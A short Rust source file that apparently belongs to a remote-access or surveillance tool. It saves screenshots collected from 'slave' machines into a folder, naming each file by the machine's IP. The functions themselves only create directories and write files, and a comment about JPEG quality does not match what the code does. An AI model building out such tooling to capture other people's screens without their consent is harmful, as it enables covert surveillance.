use std::fs;

use crate::slave::surveillance::screen::Screenshot;

pub fn ensure_directory_exists(path: &str) -> std::io::Result<()> {
    fs::create_dir_all(path)
}

pub fn normalize_filename(filename: &str) -> String {
    filename
        .replace("|", "")
        .replace("\\", "")
        .replace(":", "")
        .replace("/", "")
}

pub fn save_sceenshots(screenshots: Vec<Screenshot>, ip: String) {
    ensure_directory_exists("slave-screenshots").unwrap();

    for screenshot in screenshots {
        // Save as JPEG with 50% quality
        std::fs::write(
            format!(
                "slave-screenshots/{}__{}_monitor-{}.jpg",
                ip,
                "screenshots",
                normalize_filename(&screenshot.name)
            ),
            screenshot.image,
        )
        .unwrap();
    }
}
